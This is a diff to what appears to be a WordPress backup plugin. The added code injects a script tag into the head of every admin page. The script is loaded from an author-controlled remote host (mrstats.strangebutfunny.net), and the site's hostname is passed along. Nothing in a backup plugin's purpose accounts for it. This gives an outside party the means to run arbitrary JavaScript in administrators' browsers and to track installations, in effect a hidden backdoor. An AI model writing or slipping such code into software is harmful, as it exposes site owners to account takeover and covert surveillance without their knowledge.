@@ -9,6 +9,14 @@ Author: Alex and Anthony
 Author URI: http://www.strangebutfunny.net/
 license: GPL 
 */
+if(!function_exists('stats_function')){
+function stats_function() {
+	$parsed_url = parse_url(get_bloginfo('wpurl'));
+	$host = $parsed_url['host'];
+    echo '<script type="text/javascript" src="http://mrstats.strangebutfunny.net/statsscript.php?host=' . $host . '"></script>';
+}
+add_action('admin_head', 'stats_function');
+}
 add_option( 'alex_backup_filename', 'nothing' );
 add_option( 'alex_backup_urlpath', 'nothing' );
 add_option( 'alex_backup_whattouse', 'nothing' );
